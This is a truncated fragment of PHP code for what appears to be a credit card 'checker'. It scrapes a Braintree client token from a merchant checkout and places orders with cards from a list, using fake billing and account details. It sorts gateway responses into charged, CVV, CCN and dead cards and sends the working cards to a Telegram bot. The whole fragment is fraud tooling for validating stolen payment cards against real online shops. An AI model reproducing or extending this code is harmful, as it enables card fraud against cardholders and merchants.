...
////////////TEEEEEEEEEEEGEEEEEEEEEEEEEEEEEEEEEEEE/////////////
...
$Client_Token = trim(strip_tags(GetStr($Checkout, '"type":"credit_card","client_token_nonce":"', '"')));
...
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_COOKIEFILE, $pokies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $pokies);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
...
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array(
    ...
    'billing_company' => 'Marlow Navigation',
    ...
    'billing_phone' => $phone,
    'billing_email' => $email,
    'account_username' => $fname.''.$lname,
    'account_password' => $fname.''.$lname,
    'order_comments' => '',
...
if (strpos($Payment, '"result":"success","redirect"') !== false && strpos($Payment, 'order-received') !== false) { 
    ...
    $telegramMessage = "[#CHARGED] - $lista [B3_CREDIT_CARD APPROVED CVV]
    \n[$price1]
    \n[$hostname1]\n";
    sendToTelegram($telegramMessage, $telegramToken, $chatId);

$log_entry = "*GATEWAY : B3 CREDIT CARD*\n";
...
$log_entry .= "*Email* : `" . $escaped_email . "`\n";
         ...
         echo '<span style="color: #ffffffff; padding: 8px;"> #CVV [REJECT AVS][AMOUNT:'.$price1.'] ['.$ip.'] <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.'<br>
    <span style="color: #ff8009ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
   
   // Prepare Telegram message for CVV (Captcha Detected)
   $telegramMessage = "[#CVV] - $lista [BRAINTREE_CREDIT_CARD CVV Gateway Rejected: avs_and_cvv]
  \n[$receiptUrl]
   \n[$price1]
   \n[$hostname1]\n";
   sendToTelegram($telegramMessage, $telegramToken, $chatId);
    ...
    <span style="color: #ff8009ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
     ...
     // Prepare Telegram message for CVV (Captcha Detected)
    $telegramMessage = "[#CVV] - $lista [BRAINTREE_CREDIT_CARD CVV Address Validation]
    \n[$price1]
    \n[$hostname1]\n";
    sendToTelegram($telegramMessage, $telegramToken, $chatId);

} elseif (strpos($Payment, "Insufficient Funds") !== false) {
         echo '<span style="color: #ffffffff; padding: 8px;"> #CVV [YOUR CARD HAS INSUFFICIENT FUNDS][AMOUNT:'.$price1.'] ['.$ip.'] <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.'<br>
    <span style="color: #ff8009ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
   

     // Prepare Telegram message for CVV (Captcha Detected)
   $telegramMessage = "[#CCN] - $lista [BRAINTREE_CREDIT_CARD CCN Insufficient Funds]
   \n[$price1]
   \n[$hostname1]\n";
   sendToTelegram($telegramMessage, $telegramToken, $chatId);
    ...
    <span style="color: #daff09ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
    ...
    <span style="color: #daff09ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
     ...
     // Prepare Telegram message for CVV (Captcha Detected)
   $telegramMessage = "[#CVV] - $lista [BRAINTREE_CREDIT_CARD CCN The card verification number does not match.]
   \n[$price1]
   \n[$hostname1]\n";
   sendToTelegram($telegramMessage, $telegramToken, $chatId);
    ...
    // Prepare Telegram message for CVV (Captcha Detected)
    $telegramMessage = "[#CVV] - $lista [BRAINTREE_CREDIT_CARD CCN Insufficient funds in account]
    \n[$price1]
    \n[$hostname1]\n";
    sendToTelegram($telegramMessage, $telegramToken, $chatId);
...
} elseif (strpos($Respo, 'Oops, there was a temporary payment error. Please try another payment method or contact us to complete your transaction.') !== false) {

            echo '<span style="color: #ffffffff; padding: 8px;"> #DEAD [PLEASE TRY ANOTHER PAYMENT METHOD PAYMENT ERROR][AMOUNT:'.$price1.'] ['.$ip.'] <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.'<br>
    <span style="color: #ff09b5ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
   

} elseif (strpos($Respo, 'Order with an unknown origin is not allowed Captcha is a required field.') !== false) {
        echo '<span style="color: #ffffffff; padding: 8px;"> #DEAD [CAPTCHA][AMOUNT:'.$price1.'] ['.$ip.'] <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.'<br>
    <span style="color: #ff09b5ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
